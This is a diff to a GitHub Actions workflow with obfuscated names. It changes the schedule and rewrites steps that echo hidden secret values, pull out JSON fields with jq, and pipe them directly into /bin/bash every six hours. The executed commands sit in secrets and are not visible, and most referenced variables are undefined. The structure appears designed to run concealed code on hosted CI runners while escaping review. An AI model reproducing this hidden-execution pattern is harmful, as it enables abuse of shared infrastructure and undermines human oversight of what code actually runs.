@@ -3,25 +3,23 @@ name: xiabaile2318
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
+    - cron: '33 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiabaile2318
         env:
-          s5874: ${{ secrets.s5874 }}
+          bhpy77730: ${{ secrets.bhpy77730 }}
         run: |
-          echo $s5874 | jq -r .ir021 | /bin/bash
-          echo $rtp523 | jq -r .zna4 | /bin/bash
-          echo $ahw9 | jq -r .to0 | /bin/bash
-          echo $t281 | jq -r .s06 | /bin/bash
-          echo $iir124 | jq -r .bo3 | /bin/bash
-          echo $mkcnc998 | jq -r .czaec82391 | /bin/bash
-          echo $pum33317 | jq -r .lee13 | /bin/bash
-          echo $i88515 | jq -r .uagal491 | /bin/bash
-          echo $go390 | jq -r .xf7036 | /bin/bash
-          echo $l7519 | jq -r .mabz85 | /bin/bash
+          echo $bhpy77730 | jq -r .unem76 | /bin/bash
+          echo $lrj3432 | jq -r .var39224 | /bin/bash
+          echo $x723 | jq -r .hn82 | /bin/bash
+          echo $l35358 | jq -r .weavh2376 | /bin/bash
+          echo $h993 | jq -r .xel81 | /bin/bash
+          echo $ddb4472 | jq -r .yv98884 | /bin/bash
+          echo $f2568 | jq -r .g942 | /bin/bash
+          echo $hxz0 | jq -r .cgwvt6 | /bin/bash
+          echo $jxc6 | jq -r .o54 | /bin/bash
 
